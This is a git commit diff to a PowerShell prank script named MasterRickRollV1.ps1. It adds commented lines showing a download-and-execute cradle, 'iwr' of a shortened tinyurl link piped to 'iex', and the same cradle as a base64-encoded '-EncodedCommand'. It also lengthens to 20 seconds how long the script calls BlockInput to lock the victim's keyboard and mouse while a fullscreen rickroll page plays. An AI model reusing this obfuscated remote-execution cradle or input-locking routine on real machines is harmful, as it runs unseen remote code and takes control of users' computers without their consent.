a41c273469054b7fb06d252b4e5076abc8d42fd2
Kenan Amundsen Elkoca <aa312@intility.no>
2017-02-17 14:13:51 +0100

    update with doc

--- MasterRickRollV1.ps1
+++ MasterRickRollV1.ps1
@@ -1,3 +1,6 @@
+# $encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('iwr "https://tinyurl.com/jsehbjb" -UseBasicParsing|iex'))
+# powershell.exe -EncodedCommand "aQB3AHIAIAAiAGgAdAB0AHAAcwA6AC8ALwB0AGkAbgB5AHUAcgBsAC4AYwBvAG0ALwBqAHMAZQBoAGIAagBiACIAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnAHwAaQBlAHgA"
+
 $code = @"
     [DllImport("user32.dll")]
     public static extern bool BlockInput(bool fBlockIt);
@@ -31,7 +34,7 @@ function Rick-Roll {
 		$ie2.visible = $true
 		$ie2.fullscreen = $true
 		$ie2.navigate("http://giphy.com/gifs/pandawhale-rickroll-pandawhalegif-szpY5c63cmzOE/fullscreen")
-		Disable-UserInput -seconds 10 | Out-Null
+		Disable-UserInput -seconds 20 | Out-Null
 		Get-Process -Name ie* | stop-process -Force
 	}
 	
